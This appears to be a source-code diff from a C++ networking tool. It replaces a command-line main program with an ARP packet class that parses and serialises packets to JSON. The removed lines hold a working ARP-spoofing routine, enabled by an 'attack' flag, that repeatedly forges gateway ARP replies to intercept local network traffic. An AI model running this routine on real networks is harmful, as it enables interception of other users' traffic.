@@ -1,65 +1,58 @@
-#include <thread>
-#include <chrono>
-#include <atomic>
-#include <signal.h>
-#include "net.h"
+#include "arp.h"
 
-DEFINE_bool(attack, false, "attack whole network by pretending myself to be gateway");
-
-std::atomic<bool> end_attack = false;
-
-void on_interrupt(int) { end_attack = true; }
-
-int main(int argc, char *argv[])
+arp::arp(const u_char *const start, const u_char *&end)
 {
-    NT_TRY
-    google::InitGoogleLogging(argv[0]);
-    gflags::ParseCommandLineFlags(&argc, &argv, true);
-    FLAGS_logtostderr = 1;
-    FLAGS_minloglevel = 0;
-
-    if (argc < 2 && !FLAGS_attack) {
-        LOG(ERROR) << "empty ipv4 address, please input ip";
-        return -1;
-    }
-
-    ip4_addr input_ip = PLACEHOLDER_IPv4_ADDR;
-    if (argc >= 2) {
-        input_ip = ip4_addr(argv[1]);
-    }
-    adapter_info apt_info;
-    pcap_t *adhandle = open_target_adaptor(input_ip, false, apt_info);
-
-    if (FLAGS_attack) {
-        if (apt_info.gateway == PLACEHOLDER_IPv4_ADDR) {
-            LOG(ERROR) << "no valid gateway info: " << apt_info.gateway;
-            return -1;
-        }
-        signal(SIGINT, on_interrupt);
-        eth_addr gateway_mac;
-        if (ip2mac(adhandle, apt_info, apt_info.gateway, gateway_mac, 5000) == NTLS_SUCC) {
-            LOG(INFO) << "gateway " << apt_info.gateway << " is at " << gateway_mac;
-        }
-        LOG(INFO) << "forging gateway's mac to " << apt_info.mac << "...";
-        while (!end_attack) {
-            send_arp(adhandle, ARP_REPLY_OP, apt_info.mac, apt_info.gateway, apt_info.mac,
-                     apt_info.ip);
-            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
-        }
-        LOG(INFO) << "attack stopped";
-        if (ip2mac(adhandle, apt_info, apt_info.gateway, gateway_mac, 5000) == NTLS_SUCC) {
-            if (send_arp(adhandle, ARP_REPLY_OP, gateway_mac, apt_info.gateway, apt_info.mac,
-                         apt_info.ip) == NTLS_SUCC) {
-                LOG(INFO) << "gateway's mac restored to " << gateway_mac;
-            }
-        }
-    } else {
-        eth_addr target_mac;
-        if (ip2mac(adhandle, apt_info, input_ip, target_mac, 5000) == NTLS_SUCC) {
-            std::cout << input_ip << " is at " << target_mac << "." << std::endl;
-        } else {
-            std::cout << input_ip << " is offline." << std::endl;
-        }
-    }
-    NT_CATCH
+    d = *reinterpret_cast<const detail *>(start);
+    end = start + sizeof(detail);
 }
+
+arp::arp(bool reverse, bool reply, const mac &smac, const ip4 &sip, const mac &dmac, const ip4 &dip)
+{
+    u_short op = reverse ? (reply ? 4 : 3) : (reply ? 2 : 1);
+    d.hw_type = htons(1);
+    d.prot_type = htons(0x0800);
+    d.hw_len = 6;
+    d.prot_len = 4;
+    d.op = htons(op);
+    d.smac = smac;
+    d.sip = sip;
+    d.dmac = dmac;
+    d.dip = dip;
+}
+
+arp::~arp() {}
+
+void arp::to_bytes(std::vector<u_char> &bytes) const
+{
+    auto it = reinterpret_cast<const u_char *>(&d);
+    bytes.insert(bytes.cbegin(), it, it + sizeof(detail));
+}
+
+json arp::to_json() const
+{
+    json j;
+    j["type"] = type();
+    j["hardware-type"] = ntohs(d.hw_type);
+    j["protocol-type"] = ntohs(d.prot_type);
+    j["hardware-address-length"] = d.hw_len;
+    j["protocol-address-length"] = d.prot_len;
+    u_short op = ntohs(d.op);
+    j["operation"] = (op == 1 || op == 3)
+                         ? "request"
+                         : (op == 2 || op == 4) ? "reply" : Protocol_Type_Unimplemented(op);
+    j["source-mac"] = d.smac.to_str();
+    j["source-ip"] = d.sip.to_str();
+    j["dest-mac"] = d.dmac.to_str();
+    j["dest-ip"] = d.dip.to_str();
+    return j;
+}
+
+std::string arp::type() const
+{
+    u_short op = ntohs(d.op);
+    return (op == 1 || op == 2)
+               ? Protocol_Type_ARP
+               : (op == 3 || op == 4) ? Protocol_Type_RARP : Protocol_Type_Unimplemented(op);
+}
+
+std::string arp::succ_type() const { return Protocol_Type_Void; }
